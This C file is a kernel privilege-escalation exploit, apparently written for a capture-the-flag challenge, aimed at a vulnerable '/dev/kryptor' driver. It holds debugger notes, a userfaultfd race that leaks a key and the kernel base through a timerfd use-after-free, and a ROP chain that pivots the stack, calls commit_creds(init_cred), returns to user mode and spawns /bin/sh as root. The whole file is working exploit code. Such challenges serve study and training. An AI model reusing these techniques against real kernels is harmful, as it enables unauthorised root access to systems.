	/*
	https://gchq.github.io/CyberChef/#recipe=SHA2('256',64,160/disabled)Swap_endianness('Hex',8,true)From_Hex('Auto')To_Hex('None',0)&input=MHg3NjZmNDhmZjBhMDBhMWQ1DQoweDJhMWRmZTI2MGUzMzBjMzUNCjB4MWYyNzE4ZjJjMzUxM2U4Zg0KMHhlZTA5ZTE4ODU3ZTUwNzJlDQo&ieol=CRLF&oeol=NEL
	dump mem

	base module : 0xffffffffc0000000
	// free before loop print

	break *0xffffffffc00001B8
	break *(0xffffffffc0000000 + 0x1A4)
	break *(0xffffffffc0000000 + 0x15D)
	break *(0xffffffffc0000000 + 0x1F8) // ret
	break *(0xffffffffc0000000 + 0x23B)
	break *(0xffffffffc0000000 + 0x258)

	break *kbase + 0x14780c //pop rdi on rop
	break *kbase + 0x0f7be0
	timmer fd
	break *(kbase + 0x0905c0+0x167) lru_deactivate_fn //0010:lru_deactivate_fn+0x167

	pwndbg> info break
	Num     Type           Disp Enb Address    What
	1       breakpoint     keep y   kbase + 0x051bfc break *kbase + 0x051bfc
			breakpoint already hit 4 times
	2       breakpoint     keep y   0xdeadbeef  break *0xdeadbeefdeadbeef

			breakpoint already hit 1 time


	*/

	#define _GNU_SOURCE
	#include <assert.h>
	#include <fcntl.h>
	#include <linux/userfaultfd.h>
	#include <poll.h>
	#include <pthread.h>
	#include <sched.h>
	#include <signal.h>
	#include <stdio.h>
	#include <stdlib.h>
	#include <string.h>
	#include <sys/ioctl.h>
	#include <sys/mman.h>
	#include <sys/syscall.h>
	#include <sys/types.h>
	#include <unistd.h>
	#include <sys/timerfd.h>
	#include <stdio.h>
	#include <stdlib.h>
	#include <sys/ioctl.h>
	#include <unistd.h>
	#include <fcntl.h>
	#include <stdint.h>
	#include <sys/stat.h>

	#define DECRYPT 0xDDDDDDDD
	#define ENCRYPT 0xEEEEEEEE
	#define FREE 	0xFFFFFFFF

	#define PAGE_SIZE 0x1000

	typedef struct {
		size_t index;   // 3,2,1,0,-1,-2,... -> latest index
		char *data;     // 256LL
		char *key;      // 0x20 -> maybe key
	} request_t;

	int fd;
	char buff[0x1000];
	char timer_struct[0x100];
	char *read_buffer;

	char *null_area;
	cpu_set_t pwn_cpu;
	request_t req;
	uint64_t	race_page;
	static void	(*race_function)();
	pthread_t	thread;


	void fatal(const char *msg) {
		perror(msg);
		exit(1);
	}

	int Encrypt(){
		return ioctl(fd, ENCRYPT, &req);
	}
	int Decrypt(){
		return ioctl(fd, DECRYPT, &req);
	}
	int Free(){
		return ioctl(fd, FREE, &req);
	}

	int create_timer(int leak)
	{
	struct itimerspec its;
	
	its.it_interval.tv_sec = 0;
	its.it_interval.tv_nsec = 0;
	its.it_value.tv_sec = 2;
	its.it_value.tv_nsec = 0;
	
	int tfd = timerfd_create(CLOCK_REALTIME, 0);
	timerfd_settime(tfd, 0, &its, 0);
	
	if (leak)
	{
		close(tfd);
		sleep(1);
		return 0;
	}
	return tfd;
	}



	void leak_crypto(){
		puts("[+] leaking crypto");
		req.data = buff;
		Decrypt();
	}
	void leak_uaf(){
		puts("[+] Creating UAF");
		Free();
		create_timer(1);
	}

	void uaf_write(){
		puts("[+] Creating UAF [Write]...");
		Free();
		create_timer(0);
	}

	void *racer(void *arg)
	{
		struct uffd_msg uf_msg;
		struct uffdio_copy uf_copy;
		struct uffdio_range uf_range;
		long uffd = (long)arg;
		struct pollfd pollfd;

		pollfd.fd = uffd;
		pollfd.events = POLLIN;

		uf_range.start = race_page;
		uf_range.len = PAGE_SIZE;

		while(poll(&pollfd, 1, -1) > 0)		// waits until an event happens (like a page fault)
		{
			if(pollfd.revents & POLLERR || pollfd.revents & POLLHUP)	// check its not an error
			{
				perror("polling error");
				exit(-1);
			}
			if(read(uffd, &uf_msg, sizeof(uf_msg)) == 0)	// read the uffd_msg
			{
				perror("error reading event");
				exit(-1);
			}
			if(uf_msg.event != UFFD_EVENT_PAGEFAULT)	// check it's a page fault
			{
				perror("unexpected result from event");
				exit(-1);
			}

			race_function();

			uf_copy.src = (unsigned long)buff;		// if copying to kernel, this can be updated to what you want to send
			uf_copy.dst = race_page;
			uf_copy.len = PAGE_SIZE;
			uf_copy.mode = 0;
			uf_copy.copy = 0;
			if(ioctl(uffd, UFFDIO_COPY, (unsigned long)&uf_copy) == -1)	// resolve page fault, continue execution
			{
				perror("uffdio_copy error");
				exit(-1);
			}
			if (ioctl(uffd, UFFDIO_UNREGISTER, (unsigned long)&uf_range) == -1)	// remove uffd object
			{
				perror("error unregistering page for userfaultfd");
			}
			//if (munmap((void *)race_page, PAGE_SIZE) == -1)
			//{
			//	perror("error on munmapping race page");
			//}
			return 0;
		}
		return 0;
	}


	void register_uffd()
	{
		int uffd;
		struct uffdio_api uf_api;
		struct uffdio_register uf_register;

		uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);	// create uffd object
		uf_api.api = UFFD_API;
		uf_api.features = 0;

		if (ioctl(uffd, UFFDIO_API, (unsigned long)&uf_api) == -1)	// setup API of uffd
		{
			perror("error with the uffdio_api");
			exit(-1);
		}

		if (mmap((void *)race_page, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0) != (void *)race_page)	// mmap a region which we'll use in Encrypt to cause page fault
		{
			perror("whoopsie doopsie on mmap");
			exit(-1);
		}

		uf_register.range.start = race_page;
		uf_register.range.len = PAGE_SIZE;
		uf_register.mode = UFFDIO_REGISTER_MODE_MISSING;

		if (ioctl(uffd, UFFDIO_REGISTER, (unsigned long)&uf_register) == -1)	// establishes the memory region to monitor with uffd
		{
			perror("error registering page for userfaultfd");
		}

		if(pthread_create(&thread, NULL, racer, (void*)(long)uffd) != 0)	// run racer
		{
			perror("can't setup threads for race");
		}
		return;

	}

	// static void* fault_handler_thread(void *arg) {
	// 	static struct uffd_msg msg;
	// 	struct uffdio_copy copy;
	// 	struct pollfd pollfd;
	// 	long uffd;
	// 	static int fault_cnt = 0;

	// 	uffd = (long)arg;
	// 	puts("[+] fault_handler_thread: waiting for page fault...");
	// 	pollfd.fd = uffd;
	// 	pollfd.events = POLLIN;

	// 	while (poll(&pollfd, 1, -1) > 0) {
	// 		if (pollfd.revents & POLLERR || pollfd.revents & POLLHUP)
	// 			fatal("poll");

	// 		if (read(uffd, &msg, sizeof(msg)) <= 0) fatal("read(uffd)");
	// 		char *page_fault_location = (char *)msg.arg.pagefault.address;
	// 		assert(msg.event == UFFD_EVENT_PAGEFAULT);
	// 		printf("[-] page fault count : %d on : %p\n", fault_cnt, page_fault_location);

	// 		switch (fault_cnt++) {
	// 			case 0:
	// 				puts("[+] leaking crypto");
	// 				req.data = buff;
	// 				Decrypt();
	// 				copy.src = (unsigned long)null_area;
	// 				break;
	// 			case 1:
	// 				puts("[+] Creating UAF");
	// 				Free();
	// 				create_timer(1); //UAF
	// 				copy.src = (unsigned long)null_area;
	// 				break;
	// 			case 2:
	// 				puts("[+] Creating UAF [Write]...");
	// 				Free();
	// 				create_timer(0);
	// 				copy.src = (unsigned long)buff;
	// 				break;

	// 		}

	// 		copy.dst = (unsigned long)msg.arg.pagefault.address;
	// 		copy.len = 0x1000;
	// 		copy.mode = 0;
	// 		copy.copy = 0;

	// 		if (ioctl(uffd, UFFDIO_COPY, &copy) == -1)
	// 			fatal("ioctl(UFFDIO_COPY)");
	// 	}

	// 	return NULL;
	// }

	// int register_uffd(void *addr, size_t len) {
	// 	struct uffdio_api uffdio_api;
	// 	struct uffdio_register uffdio_register;
	// 	long uffd;
	// 	pthread_t th;

	// 	/* userfaultfdの作成 */
	// 	uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
	// 	if (uffd == -1) fatal("userfaultfd");

	// 	uffdio_api.api = UFFD_API;
	// 	uffdio_api.features = 0;
	// 	if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
	// 		fatal("ioctl(UFFDIO_API)");

	// 	/* ページをuserfaultfdに登録 */
	// 	uffdio_register.range.start = (unsigned long)addr;
	// 	uffdio_register.range.len = len;
	// 	uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
	// 	if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
	// 		fatal("UFFDIO_REGISTER");

	// 	/* ページフォルトを処理するスレッドを作成 */
	// 	if (pthread_create(&th, NULL, fault_handler_thread, (void*)uffd))
	// 		fatal("pthread_create");

	// 	return 0;
	// }

	void hexdump(unsigned char *buff, unsigned long size) {
		int i;
		for (i = 0; i < size / 8; i++) {
			if ((i % 2) == 0) {
				if (i != 0) printf("  \n");
				printf("  %04x  ", i * 8);
			}
			unsigned long ptr = ((unsigned long *)buff)[i];
			printf("0x%016lx\t", ptr);
		}
		printf("\n");
	}

	char master_key[256];

	void translate(char* x){
		for (int i = 0; i < 256; i++){
			x[i] ^= master_key[i];
		}
	}
	uint64_t user_rflags, user_cs, user_ss, user_rsp;
	void userland(){
		int fdd;
		int fz = 44982;
		char buffer[0x100];
		char real_path[100] ;
		ssize_t nread;
		struct stat file_stat; 

		asm(".intel_syntax noprefix;"
		"push 0;"
		".att_syntax;");
		puts("back to user!"); 
		
		// fdd = open("/root/", O_RDONLY);
		
		// printf("%d\n",fdd);
		// nread = syscall(SYS_getdents64, fdd, buffer, 0x100);
		
		// strcpy(real_path, "/root/");
		// strcpy(real_path+6, buffer + 0x43);
		// close(fdd);
		
		// fdd = open(real_path, O_RDONLY);

		// printf("got : \n");
		// ssize_t bytes_read;
		// bytes_read = read(fdd, read_buffer, 0xB000);
		// printf("%d\n",bytes_read);
		// printf("%s", read_buffer);
		char* argv[] = {"/bin/sh", 0};
    	execve(argv[0], argv, 0);
		exit(0);

		
		puts("HI!");

	}
	void hang(){

	}
	int main()
	{
		asm(
			".intel_syntax noprefix;"
			"mov user_cs, cs;"
			"mov user_ss, ss;"
			"mov user_rsp, rsp;"
			"pushf;"
			"pop user_rflags;"
			".att_syntax"
		);

		null_area = malloc(0x1000);
		read_buffer = mmap(0, 0xB000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE , 0, 0);
		uint64_t *rop_user = mmap((void *)0x13370000, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0);
		memset(rop_user, 0, 0x1000);
		*(volatile char*)0x13370000 = 0;
		mlock((void*)0x13370000, 0x1000);

		fd = open("/dev/kryptor", O_RDWR);
		
		race_function = &leak_crypto;
		race_page = 0xcafe0000;
		register_uffd();

		req.key = "DIVwer";
		req.index = 0;
		req.data = (char *)race_page;
		if (Encrypt()) fatal("[!] Encrypt fail");
		pthread_join(thread, NULL);

	
		int tfd = create_timer(0); // fix freelist
		memcpy(master_key, buff, 256);


		race_function = &leak_uaf;
		race_page = 0xbaad0000;
		register_uffd();
		
		req.index = 0;
		req.data = (char *)race_page;
		if (Decrypt()) fatal("[!] Decrypt fail");

		pthread_join(thread, NULL);

		printf("[?] Dumping timer_ctx\n");
		memcpy(timer_struct, (char *)race_page, 256);
		// translate(timer_struct);
		hexdump(timer_struct, 0x100);
		unsigned long current_heap = *(unsigned long*)timer_struct;
		unsigned long kbase = *(unsigned long*)&timer_struct[0x28] - 0xf7c80;
		printf("[!] c_heap : %p\n[!] kbase : %p\n", current_heap, kbase);

		close(tfd);

		unsigned long stct[0x100/8];
		memset(stct, 0, 0x100);
		stct[0x28/8] = kbase + 0x0001dc;

		unsigned long rop[0x100/8];
		memset(rop, 0, 0x100);
				rop[0] = 0; 					//pivoted RDI
				rop[4] = kbase + 0x015611;	// pop rax
		/*0x28*/rop[5] = kbase + 0x090726;	// push rdi ; pop rsp ... ret
				

	/*
		kbase + 0x14780c : pop rdi ; ret
		0x1000
		kbase + 0x004e60 : pop rsi ; ret
		0xcc0
		call ffffffff810bfbc0 T __kmalloc
		kbase + 0x073d83 : pop rcx ; ret
		0
		kbase + 0x1c265a : mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret
		kbase + 0x004e60 : pop rsi ; ret
		rop address
		kbase + 0x1477a6 : pop rdx ; ret
		0x1000
		call ffffffff8112b290 T _copy_from_user

		kbase + 0x12d9c9 : mov r8, rdi ; mov rax, r8 ; ret
		kbase + 0x10b082 : pop r8 ; ret
		0x1000
		kbase + 0x06d6d2 : sub rax, r8 ; ret
		kbase + 0x0470de : push rax ; pop rbx ; pop r12 ; pop rbp ; ret
		0
		0
		kbase + 0x11e602 : push rbx ; adc byte ptr [rbx + 0x41], bl ; pop rsp ; pop rbp ; ret
	*/
			int ict = 6;
			// rop[ict++] = kbase + 0x14780c;
			// rop[ict++] = 0x2000;
			// rop[ict++] = kbase + 0x004e60;
			// rop[ict++] = 0xcc0;
			// rop[ict++] = kbase + 0x0bfbc0; //kmalloc
			rop[ict++] = kbase + 0x14780c;
			rop[ict++] = 0x1000;
			rop[ict++] = kbase + 0x004e60;
			rop[ict++] = 0xcc0;
			rop[ict++] = kbase + 0x0bfbc0; //kmalloc
			rop[ict++] = kbase + 0x073d83;
			rop[ict++] = 0;
			rop[ict++] = kbase + 0x1c265a;
			rop[ict++] = kbase + 0x004e60;
			rop[ict++] = (unsigned long)rop_user;
			rop[ict++] = kbase + 0x1477a6; //break
			rop[ict++] = 0x100;
			rop[ict++] = kbase + 0x12b290; // copy_from_user
			
			rop[ict++] = kbase + 0x12d9c9;
			rop[ict++] = kbase + 0x10b082;
			rop[ict++] = 0x100;
			rop[ict++] = kbase + 0x06d6d2;
			rop[ict++] = kbase + 0x0470de;
			rop[ict++] = 0;
			rop[ict++] = 0;
			rop[ict++] = kbase + 0x11e602;

		memset(rop_user, 0, 0x1000);
		int ct = 0;
		rop_user[ct++] = 0xdeaddead; //junk

		rop_user[ct++] = kbase + 0x000559;// : pop rbp ; ret
		rop_user[ct++] = 0;

		// rop_user[ct++] = kbase + 0x14780c;
		// rop_user[ct++] = current_heap;
		// rop_user[ct++] = kbase + 0x004e60;
		// rop_user[ct++] = (unsigned long)timer_struct;
		// rop_user[ct++] = kbase + 0x1477a6;
		// rop_user[ct++] = 256;
		// rop_user[ct++] = kbase + 0x12b290;

		/*
		kbase + 0x14780c : pop rdi ; ret
		current_heap + 0x28
		kbase + 0x004e60 : pop rsi ; ret
		5
		kbase + 0x04c6c0 : mov qword ptr [rdi], rsi ; ret

		*/

		/*read and fix heap
		pop rax
		kbase+ 0x83f060 //address to read heap
		kbase+ 0x0a9657 : mov rax, qword ptr [rax] ; ret

		*/
		rop_user[ct++] = kbase + 0x015611; //pop rax
		rop_user[ct++] = kbase+ 0x83f060; //leak heap
		rop_user[ct++] = kbase+ 0x0a9657;// : mov rax, qword ptr [rax] ; ret;
		

		rop_user[ct++] = kbase + 0x073d83; // pop rcx
		rop_user[ct++] = 0;
		rop_user[ct++] = kbase + 0x1c265a; // mov rdi, rax
		rop_user[ct++] = kbase + 0x004e60; // pop rsi
		rop_user[ct++] = (unsigned long)stct;
		rop_user[ct++] = kbase + 0x1477a6; //break
		rop_user[ct++] = 0x100;
		rop_user[ct++] = kbase + 0x12b290; // copy_from_user
		

		/*privesc*/
		rop_user[ct++] = kbase + 0x14780c;
		rop_user[ct++] = kbase + 0x8385c0; //initcred
		rop_user[ct++] = kbase + 0x04d240; //commit_cred

		rop_user[ct++] = kbase + 0x200cc6; //kpti
		rop_user[ct++] = 0;
		rop_user[ct++] = 0;

		rop_user[ct++] = (uint64_t) &userland;
		rop_user[ct++] = user_cs;
		rop_user[ct++] = user_rflags;
		rop_user[ct++] = user_rsp;
		rop_user[ct++] = user_ss;
		
		printf("[?] used gadget of %d/32\n", ct-1);
		printf("[?] rop_user %p\n", rop_user);
		printf("break *%p\n", userland);
		getchar();
		memcpy(buff, (char*)rop, 256);
		translate(buff);
		// translate((char *)fake_struct);


		race_function = &uaf_write;
		race_page = 0xdead0000;
		register_uffd();

		req.index = 0;
		req.data = (char *)race_page;
		if (Encrypt()) fatal("[!] Encrypt fail");
		pthread_join(thread, NULL);

		/*for breakpoint break *(0xffffffffc0000000+0x258)*/
		// req.index = 1;
		// Encrypt();
		
	}
